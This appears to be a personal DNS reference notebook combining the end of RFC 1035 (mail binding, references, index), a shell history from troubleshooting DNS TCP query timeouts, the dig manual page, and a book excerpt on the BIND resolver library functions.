     labels if the data might be used to construct wildcards.  The
     reason is that the cache does not necessarily contain existing
     RRs or zone boundary information which is necessary to
     restrict the application of the wildcard RRs.

   - RR data in responses of dubious reliability.  When a resolver
     receives unsolicited responses or RR data other than that
     requested, it should discard it without caching it.  The basic
     implication is that all sanity checks on a packet should be
     performed before any of it is cached.

In a similar vein, when a resolver has a set of RRs for some name in a
response, and wants to cache the RRs, it should check its cache for
already existing RRs.  Depending on the circumstances, either the data
in the response or the cache is preferred, but the two should never be
combined.  If the data in the response is from authoritative data in the
answer section, it is always preferred.

10.3.1.8. MAIL SUPPORT

The domain system defines a standard for mapping mailboxes into domain
names, and two methods for using the mailbox information to derive mail
routing information.  The first method is called mail exchange binding
and the other method is mailbox binding.  The mailbox encoding standard
and mail exchange binding are part of the DNS official protocol, and are
the recommended method for mail routing in the Internet.  Mailbox
binding is an experimental feature which is still under development and
subject to change.




Mockapetris                                                    [Page 47]

RFC 1035        Domain Implementation and Specification    November 1987


The mailbox encoding standard assumes a mailbox name of the form
"<local-part>@<mail-domain>".  While the syntax allowed in each of these
sections varies substantially between the various mail internets, the
preferred syntax for the ARPA Internet is given in [RFC-822].

The DNS encodes the <local-part> as a single label, and encodes the
<mail-domain> as a domain name.  The single label from the <local-part>
is prefaced to the domain name from <mail-domain> to form the domain
name corresponding to the mailbox.  Thus the mailbox HOSTMASTER@SRI-
NIC.ARPA is mapped into the domain name HOSTMASTER.SRI-NIC.ARPA.  If the
<local-part> contains dots or other special characters, its
representation in a master file will require the use of backslash
quoting to ensure that the domain name is properly encoded.  For
example, the mailbox Action.domains@ISI.EDU would be represented as
Action\.domains.ISI.EDU.

10.3.1.8.1. Mail exchange binding

Mail exchange binding uses the <mail-domain> part of a mailbox
specification to determine where mail should be sent.  The <local-part>
is not even consulted.  [RFC-974] specifies this method in detail, and
should be consulted before attempting to use mail exchange support.

One of the advantages of this method is that it decouples mail
destination naming from the hosts used to support mail service, at the
cost of another layer of indirection in the lookup function.  However,
the addition layer should eliminate the need for complicated "%", "!",
etc encodings in <local-part>.

The essence of the method is that the <mail-domain> is used as a domain
name to locate type MX RRs which list hosts willing to accept mail for
<mail-domain>, together with preference values which rank the hosts
according to an order specified by the administrators for <mail-domain>.

In this memo, the <mail-domain> ISI.EDU is used in examples, together
with the hosts VENERA.ISI.EDU and VAXA.ISI.EDU as mail exchanges for
ISI.EDU.  If a mailer had a message for Mockapetris@ISI.EDU, it would
route it by looking up MX RRs for ISI.EDU.  The MX RRs at ISI.EDU name
VENERA.ISI.EDU and VAXA.ISI.EDU, and type A queries can find the host
addresses.

10.3.1.8.2. Mailbox binding (Experimental)

In mailbox binding, the mailer uses the entire mail destination
specification to construct a domain name.  The encoded domain name for
the mailbox is used as the QNAME field in a QTYPE=MAILB query.

Several outcomes are possible for this query:



Mockapetris                                                    [Page 48]

RFC 1035        Domain Implementation and Specification    November 1987


|   1. The query can return a name error indicating that the mailbox
|      does not exist as a domain name.
|
|      In the long term, this would indicate that the specified
|      mailbox doesn't exist.  However, until the use of mailbox
|      binding is universal, this error condition should be
|      interpreted to mean that the organization identified by the
|      global part does not support mailbox binding.  The
|      appropriate procedure is to revert to exchange binding at
|      this point.
|
|   2. The query can return a Mail Rename (MR) RR.
|
|      The MR RR carries new mailbox specification in its RDATA
|      field.  The mailer should replace the old mailbox with the
|      new one and retry the operation.
|
|   3. The query can return a MB RR.
|
|      The MB RR carries a domain name for a host in its RDATA
|      field.  The mailer should deliver the message to that host
|      via whatever protocol is applicable, e.g., b,SMTP.
|
|   4. The query can return one or more Mail Group (MG) RRs.
|
|      This condition means that the mailbox was actually a mailing
|      list or mail group, rather than a single mailbox.  Each MG RR
|      has a RDATA field that identifies a mailbox that is a member
|      of the group.  The mailer should deliver a copy of the
|      message to each member.
|
|   5. The query can return a MB RR as well as one or more MG RRs.

      This condition means the the mailbox was actually a mailing
      list.  The mailer can either deliver the message to the host
      specified by the MB RR, which will in turn do the delivery to
      all members, or the mailer can use the MG RRs to do the
      expansion itself.

In any of these cases, the response may include a Mail Information
(MINFO) RR.  This RR is usually associated with a mail group, but is
legal with a MB.  The MINFO RR identifies two mailboxes.  One of these
identifies a responsible person for the original mailbox name.  This
mailbox should be used for requests to be added to a mail group, etc.
The second mailbox name in the MINFO RR identifies a mailbox that should
receive error messages for mail failures.  This is particularly
appropriate for mailing lists when errors in member names should be
reported to a person other than the one who sends a message to the list.



Mockapetris                                                    [Page 49]

RFC 1035        Domain Implementation and Specification    November 1987


New fields may be added to this RR in the future.


10.3.1.9. REFERENCES and BIBLIOGRAPHY

[Dyer 87]       S. Dyer, F. Hsu, "Hesiod", Project Athena
                Technical Plan - Name Service, April 1987, version 1.9.

                Describes the fundamentals of the Hesiod name service.

[IEN-116]       J. Postel, "Internet Name Server", IEN-116,
                USC/Information Sciences Institute, August 1979.

                A name service obsoleted by the Domain Name System, but
                still in use.

[Quarterman 86] J. Quarterman, and J. Hoskins, "Notable Computer Networks",
                Communications of the ACM, October 1986, volume 29, number
                10.

[RFC-742]       K. Harrenstien, "NAME/FINGER", RFC-742, Network
                Information Center, SRI International, December 1977.

[RFC-768]       J. Postel, "User Datagram Protocol", RFC-768,
                USC/Information Sciences Institute, August 1980.

[RFC-793]       J. Postel, "Transmission Control Protocol", RFC-793,
                USC/Information Sciences Institute, September 1981.

[RFC-799]       D. Mills, "Internet Name Domains", RFC-799, COMSAT,
                September 1981.

                Suggests introduction of a hierarchy in place of a flat
                name space for the Internet.

[RFC-805]       J. Postel, "Computer Mail Meeting Notes", RFC-805,
                USC/Information Sciences Institute, February 1982.

[RFC-810]       E. Feinler, K. Harrenstien, Z. Su, and V. White, "DOD
                Internet Host Table Specification", RFC-810, Network
                Information Center, SRI International, March 1982.

                Obsolete.  See RFC-952.

[RFC-811]       K. Harrenstien, V. White, and E. Feinler, "Hostnames
                Server", RFC-811, Network Information Center, SRI
                International, March 1982.




Mockapetris                                                    [Page 50]

RFC 1035        Domain Implementation and Specification    November 1987


                Obsolete.  See RFC-953.

[RFC-812]       K. Harrenstien, and V. White, "NICNAME/WHOIS", RFC-812,
                Network Information Center, SRI International, March 1982.

[RFC-819]       Z. Su, and J. Postel, "The Domain Naming Convention for
                Internet User Applications", RFC-819, Network
                Information Center, SRI International, August 1982.

                Early thoughts on the design of the domain system.
                Current implementation is completely different.

[RFC-821]       J. Postel, "Simple Mail Transfer Protocol", RFC-821,
                USC/Information Sciences Institute, August 1980.

[RFC-830]       Z. Su, "A Distributed System for Internet Name Service",
                RFC-830, Network Information Center, SRI International,
                October 1982.

                Early thoughts on the design of the domain system.
                Current implementation is completely different.

[RFC-882]       P. Mockapetris, "Domain names - Concepts and
                Facilities," RFC-882, USC/Information Sciences
                Institute, November 1983.

                Superceeded by this memo.

[RFC-883]       P. Mockapetris, "Domain names - Implementation and
                Specification," RFC-883, USC/Information Sciences
                Institute, November 1983.

                Superceeded by this memo.

[RFC-920]       J. Postel and J. Reynolds, "Domain Requirements",
                RFC-920, USC/Information Sciences Institute,
                October 1984.

                Explains the naming scheme for top level domains.

[RFC-952]       K. Harrenstien, M. Stahl, E. Feinler, "DoD Internet Host
                Table Specification", RFC-952, SRI, October 1985.

                Specifies the format of HOSTS.TXT, the host/address
                table replaced by the DNS.





Mockapetris                                                    [Page 51]

RFC 1035        Domain Implementation and Specification    November 1987


[RFC-953]       K. Harrenstien, M. Stahl, E. Feinler, "HOSTNAME Server",
                RFC-953, SRI, October 1985.

                This RFC contains the official specification of the
                hostname server protocol, which is obsoleted by the DNS.
                This TCP based protocol accesses information stored in
                the RFC-952 format, and is used to obtain copies of the
                host table.

[RFC-973]       P. Mockapetris, "Domain System Changes and
                Observations", RFC-973, USC/Information Sciences
                Institute, January 1986.

                Describes changes to RFC-882 and RFC-883 and reasons for
                them.

[RFC-974]       C. Partridge, "Mail routing and the domain system",
                RFC-974, CSNET CIC BBN Labs, January 1986.

                Describes the transition from HOSTS.TXT based mail
                addressing to the more powerful MX system used with the
                domain system.

[RFC-1001]      NetBIOS Working Group, "Protocol standard for a NetBIOS
                service on a TCP/UDP transport: Concepts and Methods",
                RFC-1001, March 1987.

                This RFC and RFC-1002 are a preliminary design for
                NETBIOS on top of TCP/IP which proposes to base NetBIOS
                name service on top of the DNS.

[RFC-1002]      NetBIOS Working Group, "Protocol standard for a NetBIOS
                service on a TCP/UDP transport: Detailed
                Specifications", RFC-1002, March 1987.

[RFC-1010]      J. Reynolds, and J. Postel, "Assigned Numbers", RFC-1010,
                USC/Information Sciences Institute, May 1987.

                Contains socket numbers and mnemonics for host names,
                operating systems, etc.

[RFC-1031]      W. Lazear, "MILNET Name Domain Transition", RFC-1031,
                November 1987.

                Describes a plan for converting the MILNET to the DNS.

[RFC-1032]      M. Stahl, "Establishing a Domain - Guidelines for
                Administrators", RFC-1032, November 1987.



Mockapetris                                                    [Page 52]

RFC 1035        Domain Implementation and Specification    November 1987


                Describes the registration policies used by the NIC to
                administer the top level domains and delegate subzones.

[RFC-1033]      M. Lottor, "Domain Administrators Operations Guide",
                RFC-1033, November 1987.

                A cookbook for domain administrators.

[Solomon 82]    M. Solomon, L. Landweber, and D. Neuhengen, "The CSNET
                Name Server", Computer Networks, vol 6, nr 3, July 1982.

                Describes a name service for CSNET which is independent
                from the DNS and DNS use in the CSNET.






































Mockapetris                                                    [Page 53]

RFC 1035        Domain Implementation and Specification    November 1987


Index

          *   13

          ;   33, 35

          <character-string>   35
          <domain-name>   34

          @   35

          \   35

          A   12

          Byte order   8

          CH   13
          Character case   9
          CLASS   11
          CNAME   12
          Completion   42
          CS   13

          Hesiod   13
          HINFO   12
          HS   13

          IN   13
          IN-ADDR.ARPA domain   22
          Inverse queries   40

          Mailbox names   47
          MB   12
          MD   12
          MF   12
          MG   12
          MINFO   12
          MINIMUM   20
          MR   12
          MX   12

          NS   12
          NULL   12

          Port numbers   32
          Primary server   5
          PTR   12, 18



Mockapetris                                                    [Page 54]

RFC 1035        Domain Implementation and Specification    November 1987


          QCLASS   13
          QTYPE   12

          RDATA   12
          RDLENGTH  11

          Secondary server   5
          SOA   12
          Stub resolvers   7

          TCP   32
          TXT   12
          TYPE   11

          UDP   32

          WKS   12


































Mockapetris                                                    [Page 55]


		10.3.2
	10.4 DNS tcp query timeout troubleshoot


		10.4.1 My examples
306  nslookup amer.acs.com
  307  nslookup  amer.acs.com
  308  nslookup  
  309  telnet a3-adf1.amer.acs.com -p 389
  310  telnet a3-adf1.amer.acs.com 389
  311  nmap a3-adf1.amer.acs.com 
  312  cat /etc/resolv.conf 
  313  nmap 10.56.60.150
  314  whois 10.56.60.150
  315  locate whois
  316  nslookup 10.56.60.150
  317  nc -l 10.56.60.150 53
  318  telnet 10.56.60.150 53
  319  nc -l 10.56.60.150 53
  320  dig 10.56.60.150 
  321  dig +tcp 10.56.60.150 
  322  dig +tcp canada.north.amer.acs.com
  323  dig +tcp +all canada.north.amer.acs.com
  324  dig +tcp +all canada.north.amer.acs.com ANY
  325  dig +tcp +all canada.north.amer.acs.com SRV
  326  dig +tcp +all canada.north.amer.acs.com SRV,A
  327  dig +tcp +all canada.north.amer.acs.com SRV
  328  dig +tcp +all canada.north.amer.acs.com 
  329  time dig +tcp  canada.north.amer.acs.com 
  330  time dig +tcp +all canada.north.amer.acs.com SRV
  331  time dig +tcp +all @10.56.60.150 canada.north.amer.acs.com SRV
  332  time dig +tcp +all @10.56.60.150 canada.north.amer.acs.com 

		10.4.2 dig Command
Purpose

DNS lookup utility.
Syntax

dig [@server] [-b address] [-c class] [-f filename] [-k filename] [-p port#] [-q name] [-t type] [-x addr] [-y [hmac:] name:key] [-4] [-6] [name] [type] [class] [queryopt...]

dig [-h]

dig [global-queryopt...] [query...]
Description

The dig (domain information groper) command is a flexible tool for interrogating DNS name servers. It performs DNS lookups and displays the answers that are returned from the queried name server(s). Most DNS administrators use the dig command to troubleshoot DNS problems because of its flexibility, ease of use, and clarity of output. Although dig is normally used with command-line arguments, it also has a batch mode for reading lookup requests from a file. Unlike earlier versions, the BIND9 implementation of dig allows multiple lookups to be issued from the command line. Unless it is told to query a specific name server, the dig command tries each of the servers listed in the /etc/resolv.conf file. If you specify no command line arguments or options, the dig command performs an NS query for "." (the root).

It is possible to set per-user defaults for the dig command through the ${HOME}/.digrc file. The dig command reads this file and applies any options in it before the command line arguments.

The IN and CH class names overlap with the IN and CH top level domains names. When you look up these top level domains, you can either use the -t and -c options to specify the type and class or use the -q option to specify the domain name or use the IN and CH names.
Flags

Item 	Description
-b address 	Sets the source IP address of the query-to address. This must be a valid address on one of the host's network interfaces or "0.0.0.0" or "::". You can specify an optional port by appending "#port".
-c class 	Overrides the default query class (IN for internet). The class parameter value is any valid class, such as HS for Hesiod records or CH for CHAOSNET records.
-f filename 	Makes the dig command operate in batch mode by reading a list of lookup requests to process from the specified file name. The file contains a number of queries; one per line. Each entry in the file must be organized in the same way they are presented as queries to the dig command using the command-line interface.
-h 	Prints a brief summary of command-line arguments and options.
-k filename 	Specifies a TSIG key file using the -k option to sign the DNS queries sent by the dig command.
-p port# 	Queries a non-standard port number. The port# parameter value is the port number that the dig command sends its queries to instead of the standard DNS port number 53. You can use this option to test a name server that has been configured to listen for queries on a non-standard port number.
-q name 	Distinguishes the name from other arguments. Sets the query name to the name parameter value specified.
-t type 	Sets the query type to the type parameter value. It can be any valid query type that is supported in BIND9. The default query type is A, unless the -x option is supplied to indicate a reverse lookup. A zone transfer can be requested by specifying a type of AXFR. When an incremental zone transfer (IXFR) is required, the type parameter value is set to ixfr=N. The incremental zone transfer contains the changes made to the zone because the serial number in the zone's SOA record was N.
-x addr 	Simplifies reverse lookups (mapping addresses to names). The addr parameter value is an IPv4 address in dotted-decimal notation, or a colon-delimited IPv6 address. When you use this option, there is no need to provide the name, class, and type arguments. The dig command automatically performs a lookup for a name like 11.12.13.10.in-addr.arpa and sets the query type and class to PTR and IN respectively.
-y [hmac:] name:key 	Specifies the TSIG key itself on the command line; hmac is the type of the TSIG. The default value is HMAC-MD5. The name parameter value is the name of the TSIG key and the key parameter value is the actual key. The key is a base-64 encoded string, typically generated by dnssec-keygen(8). Caution must be taken when using the -y option on multi-user systems as the key can be visible in the output from ps(1) or in the shell's history file. When using TSIG authentication with the dig command, the name server that is queried needs to know the key and algorithm that is being used. In BIND, this is done by providing appropriate key and server statements in the named.conf file.
-4 	Forces the dig command to only use the IPv4 query transport.
-6 	Forces the dig command to only use the IPv6 query transport.
Parameters
Item 	Description
global-queryopt... 	Global query option (see Multiple Queries).
query 	Query option (see Query Options).
Query Options
The dig command provides a number of query options that affect the way in which lookups are made and the results displayed. Some of these set or reset flag bits in the query header, some determine which sections of the answer get printed, and others determine the timeout and retry strategies. Each query option is identified by a keyword preceded by a plus sign (+). Some keywords set or reset an option. These can be preceded by the string no to negate the meaning of that keyword. Other keywords assign values to options like the timeout interval. They have the form +keyword=value. The query options are:

+[no]tcp
    Use or do not use TCP when querying name servers. The default behavior is to use UDP unless an AXFR or IXFR query is requested, in which case a TCP connection is used. 
+[no]vc
    Use or do not use TCP when querying name servers. This alternate syntax to +[no]tcp is provided for backwards compatibility. The vc stands for virtual circuit. 
+[no]ignore
    Ignore truncation in UDP responses instead of retrying with TCP. By default, TCP retries are performed. 
+domain=somename
    Set the search list to contain the single domain somename, as if specified in a domain directive in the /etc/resolv.conf file, and enable search list processing as if the +search option was given. 
+[no]search
    Use or do not use the search list defined by the search list or domain directive in the /etc/resolv.conf file (if any). The search list is not used by default. 
+[no]defname
    Deprecated, treated as a synonym for +[no]search.
+[no]aaonly
    Sets the "aa" flag in the query.
+[no]adflag
    Set or do not set the AD (authentic data) bit in the query. The AD bit currently has a standard meaning only in responses, not in queries, but the ability to set the bit in the query is provided for completeness. 
+[no]cdflag
    Set or do not set the CD (checking disabled) bit in the query. This requests the server to not perform DNSSEC validation of responses. 
+[no]cl
    Display or do not display the CLASS when printing the record.
+[no]ttlid
    Display or do not display the TTL when printing the record.
+[no]recursive
    Toggle the setting of the RD (recursion desired) bit in the query. This bit is set by default, which means dig normally sends recursive queries. Recursion is automatically disabled when the +nssearch or +trace query options are used. 
+[no]nssearch
    When this option is set, the dig command attempts to find the authoritative name servers for the zone containing the name being looked up and display the SOA record that each name server has for the zone. 
+[no]trace
    Toggle tracing of the delegation path from the root name servers for the name being looked up. Tracing is disabled by default. When tracing is enabled, the dig command makes iterative queries to resolve the name being looked up. It follows referrals from the root servers, showing the answer from each server that was used to resolve the lookup. 
+[no]cmd
    Toggle the printing of the initial comment in the output identifying the version of dig and the query options that have been applied. This comment is printed by default. 
+[no]short
    Provide a terse answer. The default is to print the answer in a verbose form.
+[no]identify
    Show or do not show the IP address and port number that supplied the answer when the +short option is enabled. If short form answers are requested, the default is not to show the source address and port number of the server that provided the answer. 
+[no]comments
    Toggle the display of comment lines in the output. The default is to print comments. 
+[no]stats
    Toggle the printing of statistics: when the query was made, the size of the reply, and so on. The default behavior is to print the query statistics. 
+[no]qr
    Print or do not print the query as it is sent. By default, the query is not printed. 
+[no]question
    Print or do not print the question section of a query when an answer is returned. The default is to print the question section as a comment. 
+[no]answer
    Display or do not display the answer section of a reply. The default is to display it. 
+[no]authority
    Display or do not display the authority section of a reply. The default is to display it. 
+[no]additional
    Display or do not display the additional section of a reply. The default is to display it. 
+[no]all
    Set or clear all display flags. 
+time=T
    Set the timeout for a query to T seconds. The default time out is 5 seconds. An attempt to set the T parameter value to less than 1 results in a query timeout of 1 second being applied. 
+tries=A
    Set the number of times to try UDP queries to server to the A parameter value instead of the default, 3. If the A parameter value is less than or equal to zero, the number of retries is silently rounded up to 1. 
+retry=T
    Set the number of times to retry UDP queries to server to the T parameter value instead of the default, 2. Unlike +tries, this does not include the initial query.
+ndots=D
    Set the number of dots that have to appear in name to the D parameter value as it is considered absolute. The default value is one that is defined using the ndots statement in the /etc/resolv.conf file, or 1 if no ndots statement is present. Names with fewer dots are interpreted as relative names and is searched for in the domains listed in the search or domain directive in the /etc/resolv.conf file. 
+bufsize=B
    Set the UDP message buffer size advertised using EDNS0 to B bytes. The maximum and minimum sizes of this buffer are 65535 and 0, respectively. Values outside of this range are rounded up or down appropriately. Values other than zero cause an EDNS query to be sent.
+edns=#
    Specify the EDNS version to query with. Valid values are 0 to 255. Setting the EDNS version causes a EDNS query to be sent. +noedns clears the remembered EDNS version.
+[no]multiline
    Print records like the SOA records in a verbose multi-line format with human-readable comments. The default is to print each record on a single line to facilitate machine parsing of the dig output. 
+[no]fail
    Do not try the next server if you receive a SERVFAIL. The default is not to try the next server which is the reverse of normal stub resolver behavior.
+[no]besteffort
    Attempt to display the contents of messages that are malformed. The default is not to display malformed answers.
+[no]dnssec
    Request DNSSEC records to be sent by setting the DNSSEC OK bit (DO) in the OPT record in the additional section of the query.
+[no]sigchase
    Chase DNSSEC signature chains. Require the dig command to be compiled with -DDIG SIGCHASE.
+trusted-key=####
    Specify a file containing trusted keys to be used with +sigchase. Each DNSKEY record must be on its own line. If not specified, the dig command looks for the /etc/trusted-key.key file then the trusted-key.key file in the current directory. Require the dig command to be compiled with -DDIG SIGCHASE.
+[no]topdown
    When chasing DNSSEC signature chains, perform a top down validation. Require the dig command to be compiled with -DDIG SIGCHASE.

Multiple Queries

The BIND 9 implementation of dig supports specifying multiple queries on the command line (in addition to supporting the -f batch file option). Each of those queries can be supplied with its own set of flags, options and query options.

In this case, each query argument represents an individual query in the command-line syntax. Each consists of any of the standard options and flags, the name to be looked up, an optional query type, class, and any query options that must be applied to that query.
A global set of query options, which must be applied to all queries, can also be supplied. These global query options must precede the first tuple of name, class, type, options, flags, and query options supplied on the command line. Any global query options (except the +[no]cmd option) can be overridden by a query-specific set of query options. For example:

dig +qr www.isc.org any -x 127.0.0.1 isc.org ns +noqr

This dig command string shows how the dig command could be used from the command line to make three lookups: an ANY query for www.isc.org, a reverse lookup of 127.0.0.1, and a query for the NS records of isc.org. A global query option of +qr is applied, so that the dig command shows the initial query it made for each lookup. The final query has a local query option of +noqr, which means that the dig command does not print the initial query when it looks up the NS records for isc.org.
IDN SUPPORT

If the dig command has been built with internationalized domain name (IDN) support, it can accept and display non-ASCII domain names. The dig command appropriately converts character encoding of domain name before sending a request to the DNS server or displaying a reply from the server. If you would like to turn off the IDN support for some reason, define the IDN DISABLE environment variable; the following IDN support is disabled if the variable is set when the dig command runs.
Examples
A typical invocation of dig looks like:

dig @server name type

where:

server
    The name or IP address of the name server to query. This can be an IPv4 address in dotted-decimal notation or an IPv6 address in colon-delimited notation. When the supplied server argument is a hostname, the dig command resolves that name before querying that name server. If no server argument is provided, the dig command consults the /etc/resolv.conf file and queries the name servers listed there. The reply from the name server that responds is displayed. 
name
    The name of the resource record that is to be looked up.
type
    Indicates what type of query is required — ANY, A, MX, SIG, and so on. The type argument value can be any valid query type. If no type argument is supplied, the dig command performs a lookup for an A record. 

Files
Item 	Description
/etc/resolv.conf 	 
${HOME}/.digrc 	 

		10.4.3
	10.5 Programming


		10.5.1 The RES Library Set
Pro DNS and BIND ->  Chapter 14. BIND APIs and Resolver Libraries > The RES Library Set

The functionality of this set of library calls is controlled by resolv.conf (normally /etc/resolv.conf), whose format and use is described in the section "RES Library Functions" later in the chapter. Additionally, the behavior may be modified by an available structure called _res, which is accessible by the library user.
| 14.4.1. Invoking the RES Library

Each function in this library is contained in libc (GLIBC on FreeBSD), and requires the following #includes in all modules:

#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>


| 14.4.2. The _res Structure

Although most of the time the default behavior is acceptable, it is possible to modify the behavior of certain operations by manipulating the _res structure, which is contained in resolve.h (normally /usr/include/resolv.h), and is shown in the following code:
Code View: Scroll / Show All

struct __res_state {
 int    retrans;  /* retransmission interval */
 int    retry;  /* no. of retransmits */
 u_long options;  /* option flags */
 int    nscount;        /* number of name servers */

 struct sockaddr_in nsaddr_list[MAXNS];
/* address of name server */
#define nsaddr nsaddr_list[0]
/* for backward compatibility */
 u_short id;  /* current message id */
 char *dnsrch[MAXDNSRCH+1];
/* components of domain to search */
 char defdname[256]; /* default domain (deprecated) */
 u_long pfcode; /* RES_PRF_ flags - see below. */
 unsigned ndots:4;
/* threshold for initial abs. query */
 unsigned nsort:4; /* number of elements in sort_list[] */
 char unused[3];
 struct {
  struct in_addr addr;
  u_int32_t mask;
 } sort_list[MAXRESOLVSORT];
 char pad[72]; /* on an i386 this means 512b total */
};

					  


/* for INET6 */
/*
* replacement of __res_state, separated to
* keep binary compatibility.
*/
struct __res_state_ext {
 struct sockaddr_storage nsaddr_list[MAXNS];
  struct {
  int af;  /* address family for addr, mask */
  union {
  struct in_addr ina;
  struct in6_addr in6a;
  } addr, mask;
 } sort_list[MAXRESOLVSORT];
};


Various flags may be manipulated in the __res_state.options field to control system behavior:


    RES_INIT: Set when the structure has been initialized; that is, when res_init() has been called.

    RES_DEBUG: Display debug information.

    RES_AAONLY: Accept authoritative answers only. When this option is set, res_send() should continue until it finds an authoritative answer or finds an error. Currently, this is not implemented.

    RES_USEVC: Use TCP instead of UDP for queries.

    RES_STAYOPEN: Used with RES_USEVC to keep the TCP connection open between queries.

    RES_IGNTC: Unused currently. Ignore truncation errors; that is, don't retry with TCP.

    RES_RECURSE: Set the recursion-desired bit in queries. This is the default for res_query(), res_search(), and res_send(). If this bit is not set, the functions do not perform iterative queries, and expect the initiator to handle all referrals.

    RES_DEFNAMES: If set, res_search() appends the default domain name (from resolv.conf) to unqualified names (those that do not contain a dot). This option is enabled by default but is only used by res_search().

    RES_DNSRCH: If this option is set, res_search() searches for host names in the current domain and in parent domains. This option is enabled by default.

    RES_NOALIASES: This option turns off the user-level aliasing feature controlled by the 'HOSTALIASES' environment variable. Network daemons should set this option.

    RES_USE_INET6: Enables support for IPv6-only applications. This causes IPv4 addresses to be returned as an IPv4 mapped address. For example, 10.1.1.1 is returned as ::ffff:10.1.1.1 (see Chapter 5).

    RES_USE_EDNS0: Enables support for the OPT meta (pseudo) RR for the EDNS0 extension. With the option set, an OPT pseudo RR is added to the ADDITIONAL SECTION of all queries.

| 14.4.3. RES Library Functions

the res library provides a number of functions, each of which is described in the following sections.
| 14.4.3.1. dn_comp Function

The dn_comp() function converts an ASCII name to a form in which it can be used in a query. Depending on the calling parameters it may also compress a domain name by removing suffixes.

The prototype is as follows:

int dn_comp(const char *exp_dn, u_char *comp_dn, int length,
      u_chaq ar **dnptrs, u_char **lastdnptr);


Where

    The function returns the length of the compressed name, or −1 if an error occurs.

    exp_dn is a pointer to the name that needs to be compressed.

    comp_dn is a pointer to a buffer to contain the compressed name.

    length is the length of the comp_dn buffer.

    dnptrs is a pointer to an array of pointers that contain previous names in the query, which we'll call the compressed list array for ease of explanation. If dnptrs is NULL, then only conversion to uncompressed label format is performed (see the section "Name Field Format" in Chapter 15). However, if the value of dnptrs and lastdnptr is initialized to the address of the compressed list array, and the initial entry in the compressed list array is set to NULL, then the function dn_comp() will use the compressed list array as a list of name pointers that may be examined when searching for suffix compression possibilities. As each name is added, the dn_comp() function adds its pointer to the compressed list array, and lastdnptr is updated to point to the last entry in the compressed list array.

    lastdnptr is an address pointer that points to the last valid entry in the dnptrs array, and is updated on termination of the function. If lastdnptr is set to NULL, then the compressed list array is not updated.

| 14.4.3.2. dn_expand Function

The dn_expand() entry expands a compressed domain name returned in a query message.

The prototype is as follows:

int dn_expand(const u_char *msg, const u_char *eomorig,
      const u_char *comp_dn, char *exp_dn, int length);


Where

    The function returns the length of the expanded name supplied, or −1 if an error occurs.

    msg points to the buffer that contains the messages returned from a res_send(), res_query(), or res_search() function.

    eomorig is a pointer to the end of the query message, whose start is pointered to by msg, and which contains the name to be expanded.

    comp_dn is a pointer to the beginning of the name to be expanded.

    exp_dn is a pointer to a buffer that contains the expanded name on termination of the function.

    length is the size of the buffer exp_dn, and should be big enough to contain the largest possible expanded name.

| 14.4.3.3. dn_skipname Function

The dn_skipname() function skips over a compressed domain name in a query response and can be used to step through a message. By adding the returned value to a current pointer, an application can move through, or parse, a returned query.

The prototype is as follows:

int dn_skipname(const u_char *comp_dn, const u_char *eom);


Where

    The size of the compressed name is returned, or −1 if there is an error.

    comp_dn is a pointer to the beginning of the name to be skipped.

    eom is a pointer to the end of the query message containing the name to be skipped.

| 14.4.3.4. ns_get16 Function

The ns_get16() function gets a 16-bit quantity from a buffer pointed to by src.

The prototype is as follows:

u_int ns_get16(const u_char *src);


| 14.4.3.5. ns_get32 Function

The ns_get32() function gets a 32-bit quantity from a buffer pointed to by src.

The prototype is as follows:

u_long ns_get32(const u_char *src);


| 14.4.3.6. ns_put16 Function

The ns_put16() function puts a 16-bit quantity, src, into the buffer pointed to by dst.

The prototype is as follows:

void ns_put16(u_int src, u_char *dst);


| 14.4.3.7. ns_put32 Function

The ns_put32() function puts a 32-bit quantity, src, into the buffer pointed to by dst.

The prototype is as follows:

void ns_put32(u_long src, u_char *dst);


| 14.4.3.8. res_init() Function

res_init() reads resolv.conf to obtain the default domain name, search list, and the IP address(es) of the local name server(s). This function call should be issued first to initialize all necessary variables. However, if this is not done, it is called automatically by the res_send(), res_query(), or res_search() functions. On completion of this function RES_INIT is set.

The prototype is as follows:

int res_init();


The function takes no parameters, but returns 0 on success or −1 if there was insufficient memory or any other error.
| 14.4.3.9. res_mkquery Function

The res_mkquery() function constructs a standard query message in a user-supplied buffer, but does not send it. Instead, the res_send() function must be called to dispatch the query.

The prototype is as follows:

int res_mkquery(int op, const char *dname, int class,
      int type, const u_char *data, int datalen,
      const u_char *newrr_in, u_char *buf, int buflen);


Where

    The function returns the length of the created query or −1 if an error occurs.

    op is the type of operation required, and is normally set to QUERY (see Chapter 15).

    dname is a pointer to a null-terminated string containing the fully qualified name (FQDN) to be used in the query; for instance, "www.example.com."

    class is the binary value of the class type; for example, the value 1 is IN (Internet class).

    type is the binary value of the required RR type, including ANY (type = 255).

    data: Historical use with inverse queries (now obsoleted) should be set to NULL.

    datalen: Historical use with inverse queries should be set to 0.

    newrr_in is intended for use with DDNS, and is not currently supported.

    buf is a pointer to a buffer that contains the created query.

    buflen is the length of the query buffer, and should be long enough to contain the largest possible query.

| 14.4.3.10. res_query Function

The res_query() function takes the supplied parameters, automatically constructs a query, and awaits the reply. It bypasses any rules defined by RES_DEFNAMES and RES_DNSRCH. Thus, all supplied names should be fully qualified (FQDNs). It calls res_init() if RES_INIT is not set.

The prototype is as follows:

int res_query(const char *dname, int class, int type,
     u_char *answer, int anslen);


Where

    The function returns the length of the response or −1 if an error occurs.

    dname is a pointer to a null-terminated string containing the fully qualified name to be used in the query; for instance, www.example.com.

    class is the binary value of the class type; for example, the value 1 is IN (Internet class).

    type is the binary value of the required RR type, including ANY (type = 255).

    answer is a pointer to a buffer that contains the query response.

    anslen is the length of the answer buffer, and should be long enough to contain the largest possible response.

| 14.4.3.11. res_search Function

The res_search() function takes the supplied parameters and automatically constructs a query and awaits the reply, like res_query(). However, in addition, it implements the default name and search rules controlled by the RES_DEFNAMES and RES_DNSRCH options. It calls res_init() if RES_INIT is not set. It returns the first successful reply.

The prototype is as follows:

int res_search(const char *dname, int class, int type,
     u_char *answer, int anslen);


Where

    The function returns the length of the response, or −1 if an error occurs.

    dname is a pointer to a null-terminated string containing the FQDN or an unqualified name to be used in the query; for instance, "www".

    class is a binary value of the class type. For example, the value 1 is IN (Internet class).

    type is the binary value of the required RR type, including ANY (type = 255).

    answer is a pointer to a buffer to contain the response.

    anslen is the length of the answer buffer, and should be long enough to contain the largest possible response.

| 14.4.3.12. res_send Function

The res_send() function sends a preformatted query, typically created with res_mkquery(), and returns an answer. It calls res_init() if RES_INIT is not set, sends the query to the local name server, and handles timeouts and retries.

The prototype is as follows:

